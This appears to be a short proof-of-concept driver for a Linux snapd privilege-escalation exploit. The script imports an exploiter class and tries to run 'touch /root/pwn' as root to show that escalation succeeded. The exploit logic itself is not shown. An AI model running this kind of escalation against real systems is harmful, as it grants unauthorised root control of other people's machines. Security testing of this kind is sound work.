from  pe.snapd import snapdExploiter


SnapdObj = snapdExploiter()
SnapdObj.try_priv_esc("touch /root/pwn")


